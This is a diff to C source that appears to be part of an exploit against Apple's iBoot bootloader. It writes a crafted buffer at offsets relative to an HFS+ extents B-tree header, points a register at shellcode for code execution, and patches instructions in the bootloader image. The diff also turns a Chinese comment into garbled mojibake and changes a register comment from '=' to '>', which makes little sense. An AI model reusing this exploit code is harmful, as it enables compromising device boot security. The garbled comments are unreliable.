@@ -317,7 +317,7 @@ if (1) {
             PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
             PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
             PUT_DWORD_LE(buffer, 46,  (uintptr_t)image + 0x47BE0);                      /* *r2 = r4 */
-            PUT_DWORD_LE(buffer, 0x47BE0 + 4 - EXTENTS_BTREE_HEADER + 2, 1);       /* *(r0 + 4) = r9 */
+            PUT_DWORD_LE(buffer, 0x47BE0 + 4 - EXTENTS_BTREE_HEADER + 2, 1);       /* *(r0 + 4) > r9 */
             PUT_DWORD_LE(buffer, 0x47BE0 + 0x20 - EXTENTS_BTREE_HEADER, (uintptr_t)image + SHELLCODE_BASE + 1); /* r10 (code exec) */
             PUT_DWORD_LE(buffer, 0x47BE0 + 0x24 - EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47D1C); /* r11 -> lr */
 #if 0 
@@ -363,8 +363,6 @@ if (1) {
             PUT_DWORD_LE(buffer, SHELLCODE_BASE + 112 - EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x49000 );
             PUT_DWORD_LE(buffer, SHELLCODE_BASE + 116 - EXTENTS_BTREE_HEADER, (uintptr_t)image + BTREE_HEADER + 0x28 );
             PUT_DWORD_LE(buffer, SHELLCODE_BASE + 120 - EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid );
-            
-            
 #endif
             break;
 #if TREEDEPTH
@@ -691,7 +689,8 @@ patch_image(unsigned char *image)
     *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1; 
     *(uint32_t *)(image + 0x19736) = INSN2_MOV_R0_1__MOV_R0_1; 
 
-    /* make main_task show SP将真实iboot也做对应修改，再kloader运行，得到数据后用adjust_stack对齐 */
+    /* make main_task show SP */
+    /* 灏嗙湡瀹瀒boot涔熷仛瀵瑰簲淇敼锛屽啀kloader杩愯锛屽緱鍒版暟鎹悗鐢╝djust_stack瀵归綈 */
     *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13); 
     *(uint8_t *)(image + 0x34A24) = 'x'; 
     /* show task structure */
